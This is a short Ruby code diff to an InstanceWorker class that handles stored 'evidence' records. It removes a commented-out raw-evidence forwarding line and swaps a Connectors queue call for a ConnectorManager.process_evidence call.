@@ -203,9 +203,6 @@ class InstanceWorker
             trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
           end
 
-          # forward raw evidence
-          #RCS::DB::Connectors.new_raw(raw_id, index, @agent, evidence_id) unless evidence_id.nil?
-
           # delete raw evidence
           RCS::DB::GridFS.delete(raw_id, "evidence")
           trace :debug, "deleted raw evidence #{raw_id}"
@@ -221,8 +218,8 @@ class InstanceWorker
   end
 
   def save_evidence(evidence)
-    # Returns if the evidence matches Connectors with `keep` = false
-    return if RCS::DB::Connectors.add_to_queue(@target, evidence) == :discard
+    # Returns if the evidence matches connectors with `keep` = false
+    return if RCS::DB::ConnectorManager.process_evidence(@target, evidence) == :discard
 
     # check if there are matching alerts for this evidence
     RCS::DB::Alerting.new_evidence(evidence)
